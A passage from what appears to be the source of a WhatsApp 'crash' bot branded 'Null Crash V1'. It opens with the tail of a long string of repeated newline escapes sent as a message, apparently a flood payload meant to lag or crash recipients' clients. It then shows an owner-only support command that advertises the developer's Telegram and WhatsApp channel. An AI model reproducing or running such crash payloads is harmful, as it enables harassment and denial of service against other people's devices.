n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`}, { quoted: HKQuoted })
}
break;

case 'support': {
if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
    let support = `
*ꪶ ¡ϻ Nᴜʟʟ ꫂ 𝚂𝚄𝙿𝙿𝙾𝚁𝚃*

*𝙱𝙾𝚃 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 :* ꪶ ¡ϻ Nᴜʟʟ ꫂ
*𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 :* https://t.me/Nullisback

*𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿 𝙲𝙷𝙰𝙽𝙽𝙴𝙻*
https://whatsapp.com/channel/0029VbBwJYo6BIEp0Xlm1G0S

> Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ`
    det.sendMessage(n.chat, { 
        text: support,
        contextInfo: {
            mentionedJid: [n.sender],
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true,
                title: `Nᴜʟʟ Cʀᴀsʜ V𝟷`,
                body: `Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ`,
                mediaType: 1,
                thumbnailUrl: 'https://files.catbox.moe/4w8x5f.png',
                thumbnail: ``,
                sourceUrl: `https://whatsapp.com/channel/0029VbBwJYo6BIEp0Xlm1G0S`
            }
        }
    }, { quoted: HKQuoted });
};
break;

   

//=============≠≠==========
default:
}} catch (err) {
console.log('\x1b[1;31m'+err+'\x1b[0m')}}